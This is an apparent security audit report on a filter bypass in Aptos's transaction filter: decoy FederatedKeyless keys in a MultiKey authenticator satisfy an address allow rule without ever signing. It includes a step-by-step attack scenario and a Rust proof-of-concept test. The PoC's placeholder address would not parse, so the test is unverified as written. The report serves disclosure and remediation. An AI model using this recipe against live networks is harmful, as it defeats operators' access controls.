# Audit Report

## Title
MultiKey Filter Bypass via Decoy Public Key Inclusion

## Summary
The `matches_account_authenticator_address()` function in the transaction filter uses `.any()` to check if any public key in a MultiKey authenticator matches a target address, without verifying that the matching key actually signed the transaction. This allows attackers to bypass filters by including "decoy" FederatedKeyless keys with privileged JWK addresses while signing with their own keys. [1](#0-0) 

## Finding Description

The transaction filter system is used across multiple critical components (mempool, API, consensus quorum store, and block execution) to enforce access control policies. When filtering by `AccountAddress`, the filter checks various parts of the transaction including the authenticator through `matches_transaction_authenticator_address()`. [2](#0-1) 

For MultiKey authenticators, the filter iterates through all public keys and returns true if ANY key matches the target address. Specifically, for FederatedKeyless keys, it checks if the `jwk_addr` (JWK identity provider address) matches. [3](#0-2) 

The vulnerability arises because:

1. **MultiKey structure** allows combining multiple public keys of different types with a k-of-n threshold requirement [4](#0-3) 

2. **Authentication only verifies signing keys** - The MultiKeyAuthenticator verification only checks keys that actually signed (indicated by the bitmap) [5](#0-4) 

3. **Filter checks presence, not authentication** - The filter matches on ANY key present in the MultiKey, regardless of whether it signed

**Attack Scenario:**

An operator configures a filter to ALLOW only transactions from a specific trusted identity provider:
```
Allow(AccountAddress(trusted_jwk_address))
```

An attacker can bypass this by:
1. Creating a MultiKey containing:
   - A FederatedKeyless key with `jwk_addr = trusted_jwk_address` (decoy key)
   - Their own Ed25519/Secp256k1 keys
   - Setting `signatures_required = 1`
2. Signing the transaction with ONLY their own keys (not the FederatedKeyless key)
3. The filter's `any()` check finds the decoy FederatedKeyless key and returns true
4. Authentication succeeds because sufficient non-decoy keys signed
5. The transaction bypasses the intended identity provider restriction

The same vulnerability applies to the `PublicKey` matcher which also uses `.any()`: [6](#0-5) 

This breaks the **Access Control invariant** - the filter cannot enforce "must be authenticated by" semantics, only "must mention" semantics, defeating its security purpose.

## Impact Explanation

**Medium Severity** - This qualifies as "State inconsistencies requiring intervention" and filter bypass allowing unauthorized actions.

The vulnerability affects multiple critical layers:

1. **Mempool filtering** - Unauthorized transactions can enter the mempool [7](#0-6) 

2. **API simulation filtering** - Unauthorized simulations can execute [8](#0-7) 

3. **Consensus quorum store** - Unauthorized batches can be accepted [9](#0-8) 

This creates access control bypasses in environments relying on FederatedKeyless identity providers for transaction authorization, potentially enabling:
- Unauthorized operations in enterprise/regulated environments
- Circumvention of compliance controls
- Policy violation enabling subsequent exploits

While it doesn't directly cause fund loss, it defeats security controls that may be protecting funds or critical operations.

## Likelihood Explanation

**Medium Likelihood** in environments using FederatedKeyless-based access control:

**Requirements for exploitation:**
- Filter configured to allow/deny based on FederatedKeyless JWK addresses
- Attacker knowledge of the target JWK address (often public for federated identity)
- Ability to create MultiKey authenticators (standard feature)

**Ease of exploitation:**
- No special privileges required
- Trivial to create decoy MultiKey with target JWK address
- Standard transaction signing with own keys
- No cryptographic bypass needed

The likelihood is lower in default configurations but significant in enterprise deployments using federated identity for access control.

## Recommendation

Modify the filter logic to check the signature bitmap and verify that matching keys actually signed the transaction:

```rust
AccountAuthenticator::MultiKey { authenticator } => {
    // Get the bitmap of keys that actually signed
    let signing_keys: Vec<(usize, &AnyPublicKey)> = authenticator
        .signatures()
        .iter()
        .map(|(idx, _)| (*idx as usize, &authenticator.public_keys().public_keys()[*idx as usize]))
        .collect();
    
    // Check if any SIGNING key matches the address
    signing_keys
        .iter()
        .any(|(_, any_public_key)| matches_any_public_key_address(any_public_key, address))
}
```

Similarly update `matches_account_authenticator_public_key()` to check signing keys only.

Alternatively, document this limitation clearly and provide a separate `SignedByAddress` matcher that enforces signature verification.

## Proof of Concept

```rust
#[cfg(test)]
mod test_multikey_filter_bypass {
    use super::*;
    use aptos_crypto::ed25519::Ed25519PrivateKey;
    use aptos_types::{
        keyless::FederatedKeylessPublicKey,
        transaction::{
            authenticator::{AnyPublicKey, MultiKey, MultiKeyAuthenticator, AnySignature, SingleKeyAuthenticator},
            RawTransaction, SignedTransaction, Script, TransactionPayload,
        },
        chain_id::ChainId,
    };
    use aptos_crypto::{PrivateKey, Uniform};
    
    #[test]
    fn test_multikey_filter_bypass_with_decoy_jwk_address() {
        // Trusted JWK address that filter should allow
        let trusted_jwk_addr = AccountAddress::from_hex_literal("0xTRUSTED").unwrap();
        
        // Attacker's key
        let attacker_private_key = Ed25519PrivateKey::generate_for_testing();
        let attacker_public_key = AnyPublicKey::ed25519(attacker_private_key.public_key());
        
        // Create decoy FederatedKeyless key with trusted JWK address
        let (_, keyless_pk) = aptos_types::keyless::test_utils::get_sample_groth16_sig_and_pk();
        let decoy_federated_key = AnyPublicKey::federated_keyless(
            FederatedKeylessPublicKey {
                jwk_addr: trusted_jwk_addr,
                pk: keyless_pk,
            }
        );
        
        // Create MultiKey with decoy key + attacker key, requiring only 1 signature
        let multi_key = MultiKey::new(
            vec![decoy_federated_key, attacker_public_key.clone()],
            1  // Only 1 signature required
        ).unwrap();
        
        // Create transaction
        let raw_txn = RawTransaction::new(
            AccountAddress::random(),
            0,
            TransactionPayload::Script(Script::new(vec![], vec![], vec![])),
            0,
            0,
            0,
            ChainId::new(10),
        );
        
        // Sign with ONLY attacker's key (index 1), NOT the decoy key
        let attacker_signature = attacker_private_key.sign(&raw_txn).unwrap();
        let multi_key_auth = MultiKeyAuthenticator::new(
            multi_key,
            vec![(1, AnySignature::ed25519(attacker_signature))]
        ).unwrap();
        
        let signed_txn = SignedTransaction::new_single_sender(
            raw_txn,
            AccountAuthenticator::multi_key(multi_key_auth),
        );
        
        // Create filter that only allows trusted JWK address
        let filter = TransactionFilter::empty()
            .add_multiple_matchers_filter(
                true,  // Allow
                vec![TransactionMatcher::AccountAddress(trusted_jwk_addr)]
            );
        
        // VULNERABILITY: Filter allows transaction even though trusted JWK didn't sign
        assert!(filter.allows_transaction(&signed_txn), 
            "Filter bypass: Transaction allowed despite decoy key not signing");
        
        // Transaction would authenticate successfully because attacker key signed
        assert!(signed_txn.verify_signature().is_ok(),
            "Transaction authenticates with attacker's key only");
    }
}
```

This proof of concept demonstrates that an attacker can bypass a filter intended to restrict transactions to a specific identity provider by including that provider's JWK address as a decoy key in a MultiKey while signing with their own keys. The filter incorrectly allows the transaction because it checks key presence rather than signature verification.

## Notes

This vulnerability is particularly concerning for enterprise and regulated blockchain deployments that rely on federated identity providers (FederatedKeyless) for access control. The filter system cannot currently distinguish between "this identity provider vouched for this transaction" versus "this transaction mentions this identity provider." Organizations using JWK address-based filtering for compliance or security policies should be aware that these controls can be trivially bypassed until this issue is addressed.

### Citations

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L197-202)
```rust
            TransactionMatcher::AccountAddress(address) => {
                matches_sender_address(signed_transaction, address)
                    || matches_entry_function_module_address(signed_transaction, address)
                    || matches_multisig_address(signed_transaction, address)
                    || matches_script_argument_address(signed_transaction, address)
                    || matches_transaction_authenticator_address(signed_transaction, address)
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L271-275)
```rust
        AccountAuthenticator::MultiKey { authenticator } => authenticator
            .public_keys()
            .public_keys()
            .iter()
            .any(|any_public_key| matches_any_public_key_address(any_public_key, address)),
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L303-307)
```rust
        AccountAuthenticator::MultiKey { authenticator } => authenticator
            .public_keys()
            .public_keys()
            .iter()
            .any(|key| key == any_public_key),
```

**File:** crates/aptos-transaction-filters/src/transaction_filter.rs (L312-325)
```rust
fn matches_any_public_key_address(any_public_key: &AnyPublicKey, address: &AccountAddress) -> bool {
    // Match all variants explicitly to ensure future enum changes are caught during compilation
    match any_public_key {
        AnyPublicKey::Ed25519 { .. }
        | AnyPublicKey::Secp256k1Ecdsa { .. }
        | AnyPublicKey::Secp256r1Ecdsa { .. }
        | AnyPublicKey::SlhDsa_Sha2_128s { .. }
        | AnyPublicKey::Keyless { .. } => false,
        AnyPublicKey::FederatedKeyless { public_key } => {
            // Check if the public key's JWK address matches the given address
            public_key.jwk_addr == *address
        },
    }
}
```

**File:** types/src/transaction/authenticator.rs (L1104-1111)
```rust
        let authenticators: Vec<SingleKeyAuthenticator> =
            std::iter::zip(self.signatures_bitmap.iter_ones(), self.signatures.iter())
                .map(|(idx, sig)| SingleKeyAuthenticator {
                    public_key: self.public_keys.public_keys[idx].clone(),
                    signature: sig.clone(),
                })
                .collect();
        Ok(authenticators)
```

**File:** types/src/transaction/authenticator.rs (L1133-1136)
```rust
pub struct MultiKey {
    public_keys: Vec<AnyPublicKey>,
    signatures_required: u8,
}
```

**File:** mempool/src/shared_mempool/tasks.rs (L435-437)
```rust
            if transaction_filter_config
                .transaction_filter()
                .allows_transaction(&transaction)
```

**File:** api/src/transactions.rs (L622-624)
```rust
                && !api_filter
                    .transaction_filter()
                    .allows_transaction(&signed_transaction)
```

**File:** consensus/src/quorum_store/batch_coordinator.rs (L195-199)
```rust
                    if !transaction_filter.allows_transaction(
                        batch.batch_info().batch_id(),
                        batch.author(),
                        batch.digest(),
                        transaction,
```
